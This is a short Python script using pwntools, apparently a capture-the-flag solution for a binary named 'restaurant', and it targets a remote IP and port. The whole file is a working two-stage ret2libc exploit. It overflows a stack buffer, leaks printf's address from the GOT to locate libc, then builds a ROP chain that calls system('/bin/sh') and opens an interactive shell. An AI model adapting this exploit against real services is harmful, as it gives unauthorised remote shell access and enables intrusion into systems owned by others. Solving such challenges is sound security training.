from pwn import * 

libc=ELF("libc.so.6")
#p=process("./restaurant")
p=remote("94.237.56.188",57355)
entry=0x4006e0
rdi=0x00000000004010a3
p.sendline("1")
printf_got=0x601fb8
puts_plt=0x0000000000400650

p.sendline(b"a"*0x28+p64(rdi)+p64(printf_got)+p64(puts_plt)+p64(entry))
p.recvuntil(b"aaaaaaaaa\xa3\x10@")
leak=u64(p.recv(6)+b"\x00\x00")
libc.address=leak-libc.symbols["printf"]



system=libc.symbols["system"]
binsh=next(libc.search(b"/bin/sh"))

p.sendline("1")
ret= 0x0000000000400eec

p.sendline(b"a"*0x28+p64(ret)+p64(rdi)+p64(binsh)+p64(system))
p.interactive()
